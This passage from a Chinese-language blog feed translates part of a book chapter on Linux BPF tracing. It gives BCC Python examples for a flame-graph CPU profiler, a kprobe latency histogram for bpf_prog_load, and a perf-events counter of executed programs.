class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>1：遍历我们收集的所有跟踪，以便我们可以按顺序打印它们。</p><p>2：验证我们是否获得了堆栈标识符，我们可以稍后将其与特定的代码行相关联。如果我们得到一个无效值，我们将在火焰图中使用一个占位符。</p><p>3：以相反的顺序遍历堆栈跟踪中的所有条目。我们这样做是希望在顶部看到最近执行的第一个代码路径，就像在任何堆栈跟踪中所期望的那样。</p><p>4：使用BCC帮助程序符号将堆栈帧的内存地址转换为我们源代码中的函数名称。</p><p>5：格式化以分号分隔的堆栈跟踪行。这是火焰图脚本希望能够生成我们的可视化的格式。</p><p>完整的<code>profiler.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, PerfSWConfig, PerfType</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))</span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,</span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):</span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:</span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):</span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)</span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>随着我们的BPF分析器完成，我们可以将它运行以收集我们Go程序的堆栈跟踪。 我们需要将Go程序的进程ID传递给我们的分析器，以确保我们只收集此应用程序的跟踪；我们可以使用<code>pgrep</code>找到该PID。</p><p>首先我们需要将Go程序运行起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# go run main.go</span><br></pre></td></tr></table></figure><p>如果你将探测器保存在名为<code>profiler.py</code>的文件中，下面就是运行探测器的方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# python3 profiler.py `pgrep -nx go` &gt; /tmp/profile.out</span><br></pre></td></tr></table></figure><p><code>pgrep</code>将在PID中搜索名称与go匹配的系统上运行的进程。我们将分析器的输出发送到一个临时文件，以便我们可以生成火焰图可视化。</p><p>正如我们之前提到的，我们将使用<code>Brendan Gregg</code>的`FlameGraph脚本为我们的图生成一个SVG文件； 你可以在<a href="!https://github.com/brendangregg/FlameGraph">GitHub</a>中找到这些脚本。 下载后可以使用 flamegraph.pl 生成图。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos FlameGraph]# ./flamegraph.pl /tmp/profile.out &gt; /tmp/flamegraph.svg</span><br></pre></td></tr></table></figure><p>使用浏览器打开图片如下</p><p><img src="/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/1.png" alt="1"></p><p>这种探查器对于跟踪系统中的性能问题很有用。 BCC已经包含一个比我们示例中的更高级的分析器，可以直接在生产环境中使用。除了分析器之外，BCC还包括了帮助生成CPU外火焰图和许多其他可视化来分析系统的工具。</p><h4 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h4><p>直方图是显示多个值范围出现频率的图表。表示这一点的数字数据被分成桶，每个桶包含桶内任何数据点的出现次数。直方图测量的频率是每个桶的高度和宽度的组合。如果桶被分成相等的范围，这个频率匹配直方图的高度，但如果范围没有被平均划分，你需要将每个高度乘以每个宽度来找到正确的频率。</p><p>直方图是进行系统性能分析的基本组成部分。它们是表示可测量事件（如指令延迟）分布的绝佳工具，因为它们显示的信息比通过其他测量（如平均值）获得的更准确。</p><p>BPF程序可以基于许多指标创建直方图。你可以使用BPF图来收集信息，将其分类到桶中，然后为你的数据生成直方图表示。实现这个逻辑并不复杂，但是如果每次需要分析程序的输出时都想打印直方图就会变得乏味。BCC包含一个开箱即用的实现，可以在每个程序中重复使用，而无需每次手动计算分桶和频率。</p><p>作为一个有趣的实验，我们将展示如何使用BCC的直方图来可视化应用程序调用<code>bpf_prog_load</code>指令时加载BPF程序所引入的延迟。我们使用<code>kprobes</code>来收集该指令完成所需的时间，并将结果累积在一个直方图中，稍后我们将对其进行可视化。为了便于理解，我们将这个示例分成了几个部分。</p><p>第一部分包括了BPF程序的初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;1</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();2</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：使用宏创建BPF哈希映射来存储触发<code>bpf_prog_load</code>指令的初始时间。</p><p>2：使用新的宏创建BPF直方图。这不是原生BPF映射；BCC包含此宏，以便让你更轻松地创建这些可视化。在底层，这个BPF直方图使用数组映射来存储信息。它还有几个助手来进行分桶并创建最终图。</p><p>3：当应用程序触发我们要跟踪的指令时，使用程序 PID 来存储。</p><p>让我们看看我们如何计算延迟的增量并将其存储在我们的直方图中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;1</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：计算指令被调用的时间和我们的程序到达这里的时间之间的增量； 我们可以假设这也是指令完成的时间。</p><p>2：将该增量存储在我们的直方图中。我们在这条线上做了两个操作。 首先，我们使用内置函数<code>bpf_log2l</code>为 <code>delta</code>的值生成桶标识符。此功能会随着时间的推移创建稳定的值分布。然后，我们使用增量函数向这个桶中添加一个新项目。默认情况下，如果直方图中存在<code>bucket</code>，则<code>increment</code>会将该值加1，否则会启动一个值为1的新bucket，因此无需担心该值是否存在。</p><p>我们需要编写的最后一段代码将这两个函数附加到有效的<code>kprobe</code>上，并在屏幕上打印直方图，以便我们可以看到延迟分布。这部分是我们初始化BPF程序并等待事件生成直方图的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><p>正如我们在本节开头提到的，直方图可用于观察系统中的异常情况。BCC工具包括许多使用直方图表示数据的脚本。需要深入了解系统时可以查看它们。</p><p><code>histogram.py</code>完整代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><h4 id="Perf-Events"><a href="#Perf-Events" class="headerlink" title="Perf Events"></a>Perf Events</h4><p>我们相信<code>Perf</code>事件可能是成功使用BPF跟踪所需掌握的最重要的通信方法。我们在前一章中讨论了<code>BPF Perf</code>事件数组映射。它们允许你将数据放入与用户空间程序实时同步的环形缓冲区中。当你在BPF程序中收集大量数据，并希望将处理可视化工作转移到用户空间程序时，这是一个理想的选择。这将允许你对表示层进行更多控制，因为在编程能力方面不受BPF虚拟机的限制。你可以找到的大多数BPF跟踪程序的目的是使用<code>Perf</code>事件。</p><p>这里我们将展示如何使用它们提取有关二进制执行的信息，并对这些信息进行分类，以打印系统中执行最多的二进制文件。我们已将此示例分为两个代码块，以便你可以轻松地了解此示例。在第一块中，我们定义BPF程序并将其附加到<code>kprobe</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);1</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bpf = BPF(text = bpf_source)<span class="number">3</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br></pre></td></tr></table></figure><p>1：使用<code>BPF_PERF_OUTPUT</code>输出声明<code>Perf</code>事件映射。这是BCC提供的用于声明此类映射的宏。我们将此映射命名为<code>events</code>。</p><p>2：在获得内核执行的程序的名称后，将其发送到用户空间进行聚合。我们使用<code>perf_submit</code>来实现这一点。此函数使用我们的新信息更新<code>Perf events</code>映射。</p><p>3：初始化BPF程序并将其附着到<code>kprobe</code>，以便在系统中执行新程序时触发。</p><p>现在我们已经编写了收集系统中执行的所有程序的代码，我们需要在用户空间中聚合它们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span><span class="number">2</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)<span class="number">3</span></span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:<span class="number">5</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><p>1：声明一个计数器来存储我们的程序信息。我们使用程序的名称作为键，值将是计数器。我们使用<code>aggregate_ programs</code>函数从<code>Perf</code>事件映射中收集数据。在本例中可以看到我们如何使用BCC宏访问映射并从堆栈顶部提取下一个传入数据事件。</p><p>2：增加我们收到具有相同程序名称的事件的次数。</p><p>3：使用函数<code>open_perf_buffer</code>告诉BCC，每次从<code>Perf events</code>映射接收到事件时，它都需要执行<code>aggregate</code>函数程序。</p><p>4：BCC在打开环形缓冲区后轮询事件，直到我们中断此Python程序。等待的时间越长，处理的信息就越多。可以看到我们如何使用<code>perf_buffer_poll</code></p><p>5：使用<code>most_common</code>函数获取计数器和循环中的元素列表，以打印系统中执行次数最多的程序。</p><p><code>perf_events.py</code>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)</span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们只触及了使用BPF进行跟踪的表面。Linux内核允许您访问其他工具更难以获取的信息。BPF使此过程更具可预测性，因为它提供了访问此数据的公共接口。在后面的章节中，您将看到更多使用此处描述的一些技术的示例，例如将函数附着到跟踪点。</p><p>在下一章中，我们将展示系统社区在BPF基础上构建的一些工具，用于进行性能分析和跟踪。这些专用工具可以让你访问我们看到的打包格式的大部分信息。这样你就不需要重写已经存在的工具。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一章节&quot;&gt;&lt;a href=&quot;#第一章节&quot; class=&quot;headerlink&quot; title=&quot;第一章节&quot;&gt;&lt;/a&gt;第一章节&lt;/h2&gt;&lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
</feed>
